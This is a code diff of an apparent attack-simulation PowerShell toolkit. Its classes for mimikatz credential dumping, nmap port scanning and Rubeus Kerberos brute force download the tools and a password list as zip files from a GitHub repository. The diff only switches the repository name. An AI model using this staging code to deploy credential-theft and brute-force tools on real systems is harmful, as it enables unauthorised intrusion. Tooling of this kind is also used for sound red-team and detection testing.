@@ -68,7 +68,7 @@ class Mimikatz {
 
     hidden [void] Prepare() {
         if (!(IsFile $this.mimikatz_exe)) {
-            $url = "https://github.com/spearmin10/chess/blob/main/bin/mimikatz.zip?raw=true"
+            $url = "https://github.com/spearmin10/corvette/blob/main/bin/mimikatz.zip?raw=true"
             $file = DownloadFile $url ([IO.Path]::GetTempPath())
             Expand-Archive -Force $file $this.mimikatz_dir
             Remove-Item $file
@@ -92,7 +92,7 @@ class PortScan {
 
     hidden [void] Prepare() {
         if (!(IsFile $this.nmap_exe)) {
-            $url = "https://github.com/spearmin10/chess/blob/main/bin/nmap-7.92.zip?raw=true"
+            $url = "https://github.com/spearmin10/corvette/blob/main/bin/nmap-7.92.zip?raw=true"
             $file = DownloadFile $url ([IO.Path]::GetTempPath())
             Expand-Archive -Force $file $this.nmap_dir
             Remove-Item $file
@@ -128,11 +128,11 @@ class KerberosBruteForce {
 
     hidden [void] Prepare() {
         if (!(IsFile $this.rubeus_exe)) {
-            $url = "https://github.com/spearmin10/chess/blob/main/bin/rubeus.zip?raw=true"
+            $url = "https://github.com/spearmin10/corvette/blob/main/bin/rubeus.zip?raw=true"
             DownloadAndExtractArchive $url $this.rubeus_dir
         }
         if (!(IsFile $this.passwords_file)) {
-            $url = "https://github.com/spearmin10/chess/blob/main/bin/passwords.zip?raw=true"
+            $url = "https://github.com/spearmin10/corvette/blob/main/bin/passwords.zip?raw=true"
             DownloadAndExtractArchive $url $this.rubeus_dir
         }
     }
